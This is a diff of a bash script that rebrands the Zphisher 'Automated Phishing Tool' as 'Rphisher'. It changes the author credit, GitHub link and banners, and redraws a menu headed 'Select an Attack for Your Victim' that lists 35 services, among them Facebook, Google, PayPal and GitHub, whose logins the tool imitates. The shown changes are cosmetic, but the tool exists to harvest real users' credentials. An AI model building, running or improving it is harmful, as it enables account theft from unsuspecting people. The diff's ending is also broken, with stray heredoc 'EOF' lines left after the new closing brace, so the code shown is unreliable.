@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Rphisher 	: 	Automated Phishing Tool
+##   Author 	: 	TREDWOODS KENYAN
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/KenyanRedwoods01/redkenzphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -204,16 +204,15 @@ check_status() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE} ██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+		${ORANGE} ██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
+		${ORANGE} ██████╔╝██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
+		${ORANGE} ██╔═══╝ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
+		${ORANGE} ██║     ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
+		${ORANGE} ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+		${RED} Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by REDWOODSKEN${WHITE}
 	EOF
 }
 
@@ -221,9 +220,14 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}  ██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+		${BLUE}  ██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
+		${BLUE}  ██████╔╝██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
+		${BLUE}  ██╔═══╝ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
+		${BLUE}  ██║     ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
+		${BLUE}  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${WHITE} ${__version__}
+		
+		${CYAN}      [ REDWOODSKEN - R-PHISHER ]${WHITE}
 	EOF
 }
 
@@ -733,26 +737,36 @@ site_vk() {
 	esac
 }
 
-## Menu
+## Main Menu
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}╭───────────────────────────────────────────────╮
+		${RED}│${WHITE}         🚀 Select an Attack for Your Victim       ${RED}│
+		${RED}╰───────────────────────────────────────────────╯
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${RED}╭─────────────────────┬─────────────────────┬─────────────────────╮
+		${RED}│${WHITE} [01] Facebook      ${RED}│${WHITE} [11] Twitch       ${RED}│${WHITE} [21] DeviantArt    ${RED}│
+		${RED}│${WHITE} [02] Instagram     ${RED}│${WHITE} [12] Pinterest    ${RED}│${WHITE} [22] Badoo         ${RED}│
+		${RED}│${WHITE} [03] Google        ${RED}│${WHITE} [13] Snapchat     ${RED}│${WHITE} [23] Origin        ${RED}│
+		${RED}│${WHITE} [04] Microsoft     ${RED}│${WHITE} [14] Linkedin     ${RED}│${WHITE} [24] Dropbox       ${RED}│
+		${RED}│${WHITE} [05] Netflix       ${RED}│${WHITE} [15] Ebay         ${RED}│${WHITE} [25] Yahoo         ${RED}│
+		${RED}│${WHITE} [06] Paypal        ${RED}│${WHITE} [16] Quora        ${RED}│${WHITE} [26] Wordpress     ${RED}│
+		${RED}│${WHITE} [07] Steam         ${RED}│${WHITE} [17] Protonmail   ${RED}│${WHITE} [27] Yandex        ${RED}│
+		${RED}│${WHITE} [08] Twitter       ${RED}│${WHITE} [18] Spotify      ${RED}│${WHITE} [28] StackOverflow ${RED}│
+		${RED}│${WHITE} [09] Playstation   ${RED}│${WHITE} [19] Reddit       ${RED}│${WHITE} [29] VK            ${RED}│
+		${RED}│${WHITE} [10] Tiktok        ${RED}│${WHITE} [20] Adobe        ${RED}│${WHITE} [30] XBOX          ${RED}│
+		${RED}╰─────────────────────┴─────────────────────┴─────────────────────╯
+		${RED}╭─────────────────────┬─────────────────────┬─────────────────────╮
+		${RED}│${WHITE} [31] Mediafire     ${RED}│${WHITE} [32] Gitlab       ${RED}│${WHITE} [33] Github        ${RED}│
+		${RED}│${WHITE} [34] Discord       ${RED}│${WHITE} [35] Roblox       ${RED}│                         ${RED}│
+		${RED}╰─────────────────────┴─────────────────────┴─────────────────────╯
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}╭───────────────────────────────────────────────╮
+		${RED}│${WHITE}  [99] About                              [00] Exit   ${RED}│
+		${RED}╰───────────────────────────────────────────────╯
+	EOF
+}
 
 	EOF
 	
